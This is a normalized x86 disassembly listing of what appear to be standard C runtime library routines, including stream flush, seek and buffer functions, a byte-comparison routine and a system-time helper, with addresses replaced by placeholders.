push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1002f583
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_10025122
push 0xc
push r--data
call sub_1002ca38
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10025031
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002518a
mov eax [ ebp - 0x1c ]
call sub_1002972b
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1002ca7d
retn
sub_10025194
push 0xc
push r--data
call sub_1002ca38
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_1002ed42
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1002ca7d
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10025290
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_1002f5cc
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_10025298
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10025558
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_1002f848
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002ed42
pop ecx
push eax
call sub_1002f76c
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_10025322
push 0xc
push r--data
call sub_1002ca38
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10025298
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002539d
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_1002ca7d
retn
cmp edi 0x2
jne r-xdata
sub_100253a7
mov edi edi
push ebp
mov ebp esp
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1002fd31
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
or eax 0xffffffff
mov [ esi + 0x4 ] edx
cmp ecx eax
je r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebp
retn
pop esi
xor eax eax
sub_10025415
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_1002fe17
add esp 0x10
pop esi
pop ebp
retn
sub_1002545a
push 0xc
push r--data
call sub_1002ca38
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x4
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_1002ca7d
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp eax 0x40
jne r-xdata
cmp eax 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] ebx
push esi
call sub_10025558
push esi
call sub_1002fe66
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test [ ebp + 0x10 ] 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_1002a000
pop ecx
cmp eax ebx
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002554e
mov eax [ ebp - 0x1c ]
sub_10025558
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1002ed42
pop ecx
push eax
call sub_1002f4a7
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100255c0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10025558
pop ecx
test eax eax
je r-xdata
push esi
call sub_10025608
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1002ed42
push eax
call sub_1002fe97
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10025608
push 0x14
push r--data
call sub_1002ca38
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100256d9
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1002ca7d
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_100274df
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_100256aa
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_100255c0
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_100255c0
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_100256e2
push 0xc
push r--data
call sub_1002ca38
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_100255c0
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002572b
mov eax [ ebp - 0x1c ]
push esi
call sub_10025608
pop ecx
jmp r-xdata
call sub_1002ca7d
retn
sub_1002573e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_10025558
push esi
mov ebx eax
call sub_1002fe66
push esi
call sub_1002ed42
push eax
call sub_10030014
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_10024aba
pop ecx
mov [ esi + 0x1c ] edi
sub_100257b5
push 0xc
push r--data
call sub_1002ca38
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1002749e
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_1002573e
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10025829
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_1002ca7d
retn
mov eax [ ebp - 0x1c ]
sub_10025831
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_1002b200
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_10025882
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_10026e82 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
